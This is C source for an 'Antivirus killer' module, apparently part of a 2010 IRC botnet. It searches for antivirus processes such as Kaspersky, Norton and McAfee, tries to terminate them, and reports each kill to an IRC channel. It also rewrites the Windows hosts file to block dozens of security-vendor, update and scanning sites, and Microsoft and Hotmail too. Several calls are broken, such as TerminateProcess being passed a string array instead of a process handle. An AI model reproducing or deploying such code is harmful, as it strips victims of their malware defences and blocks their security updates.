#include "wALL.h"
//Antivirus "killer"
//I don't usually do this but: Aug 11, 2010
//xNull - (2010)

char* szProc[] = { "avp.exe", //kaspersky
				   "norton.exe",
				   "ccsvchst.exe", //Symantec
				   "kaspersky.exe",
				   "mcafee.exe"
				}; 

void ModifyHostFiles() {
	FILE *Host = fopen( "C:\\Windows\\System32\\drivers\\etc\\hosts", "rw" );
	fprintf(Host, "\n\r\n\r\n\r");
	fprintf(Host, "127.0.0.1 avp.com\n");
	fprintf(Host, "127.0.0.1 ca.com\n");
	fprintf(Host, "127.0.0.1 customer.symantec.com\n");
	fprintf(Host, "127.0.0.1 dispatch.mcafee.com\n");
	fprintf(Host, "127.0.0.1 download.mcafee.com\n");	
	fprintf(Host, "127.0.0.1 f-secure.com\n");
	fprintf(Host, "127.0.0.1 kaspersky-labs.com\n");
	fprintf(Host, "127.0.0.1 kaspersky.com\n");
	fprintf(Host, "127.0.0.1 liveupdate.symantec.com\n");
	fprintf(Host, "127.0.0.1 liveupdate.symantecliveupdate.com\n");
	fprintf(Host, "127.0.0.1 mast.mcafee.com\n");
	fprintf(Host, "127.0.0.1 mcafee.com\n");
	fprintf(Host, "127.0.0.1 my-etrust.com\n");
	fprintf(Host, "127.0.0.1 nai.com\n");
	fprintf(Host, "127.0.0.1 networkassociates.com\n");
	fprintf(Host, "127.0.0.1 rads.mcafee.com\n");
	fprintf(Host, "127.0.0.1 scanner.novirusthanks.org\n");
	fprintf(Host, "127.0.0.1 secure.nai.com\n");
	fprintf(Host, "127.0.0.1 securityresponse.symantec.com\n");
	fprintf(Host, "127.0.0.1 sophos.com\n");
	fprintf(Host, "127.0.0.1 symantec.com\n");
	fprintf(Host, "127.0.0.1 threatexpert.com\n");
	fprintf(Host, "127.0.0.1 trendmicro.com\n");
	fprintf(Host, "127.0.0.1 update.symantec.com\n");
	fprintf(Host, "127.0.0.1 updates.symantec.com\n");
	fprintf(Host, "127.0.0.1 us.mcafee.com\n");
	fprintf(Host, "127.0.0.1 virscan.org\n");
	fprintf(Host, "127.0.0.1 viruslist.com\n");
	fprintf(Host, "127.0.0.1 virusscan.jotti.org\n");
	fprintf(Host, "127.0.0.1 virustotal.com\n");
	fprintf(Host, "127.0.0.1 www.avp.com\n");
	fprintf(Host, "127.0.0.1 www.ca.com\n");
	fprintf(Host, "127.0.0.1 www.f-secure.com\n");
	fprintf(Host, "127.0.0.1 www.grisoft.com\n");
	fprintf(Host, "127.0.0.1 www.kaspersky.com\n");
	fprintf(Host, "127.0.0.1 www.mcafee.com\n");
	fprintf(Host, "127.0.0.1 www.my-etrust.com\n");
	fprintf(Host, "127.0.0.1 www.nai.com\n");
	fprintf(Host, "127.0.0.1 www.networkassociates.com\n");
	fprintf(Host, "127.0.0.1 www.sophos.com\n");
	fprintf(Host, "127.0.0.1 www.symantec.com\n");
	fprintf(Host, "127.0.0.1 www.trendmicro.com\n");
	fprintf(Host, "127.0.0.1 www.virscan.org\n");
	fprintf(Host, "127.0.0.1 www.viruslist.com\n");
	fprintf(Host, "127.0.0.1 www.virusscan.jotti.org\n");
	fprintf(Host, "127.0.0.1 bitdefender.com\n");
	fprintf(Host, "127.0.0.1 macafee.com\n");
	fprintf(Host, "127.0.0.1 microsoft.com\n");
	fprintf(Host, "127.0.0.1 nod32.com\n");
	fprintf(Host, "127.0.0.1 norton.com\n");
	fprintf(Host, "127.0.0.1 pandasoftware.com\n");
	fprintf(Host, "127.0.0.1 www.download.mcafee.com\n");
	fprintf(Host, "127.0.0.1 www.hotmail.com\n");
	fprintf(Host, "127.0.0.1 www.kaspersky-labs.com\n");
	fprintf(Host, "127.0.0.1 www.macafee.com\n");
	fprintf(Host, "127.0.0.1 www.microsoft.com\n");
	fprintf(Host, "127.0.0.1 www.nod32.com\n");	
	fprintf(Host, "127.0.0.1 www.norton.com\n");
	fprintf(Host, "127.0.0.1 www.pandasoftware.com\n");
	fprintf(Host, "127.0.0.1 www.virustotal.com\n");

	return;
}

int AntivirusKiller() {
	char buffer[128];
	memset(buffer, 0, sizeof( buffer ) );
    PROCESSENTRY32 pe32 = { sizeof( PROCESSENTRY32 ) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, 0 );
    
    if( Process32First( hSnapshot, &pe32 ) )
    {                       
        do 
        {         
            for( int i = 0; i < ( sizeof( szProc ) / sizeof( char* ) ); i++ )
            {
                if( strstr( pe32.szExeFile, szProc[ i ] ) )
                {
					TerminateProcess( szProc, 0 );
					sprintf(buffer, "Killed: %s", szProc);
					IRC_Send(MSG_PRIVMSG, buffer, cfg_ircchannel);
                }
            }
        }
        while( Process32Next( hSnapshot, &pe32 ) );  
    }
	ModifyHostFiles();
    return( 0 );
}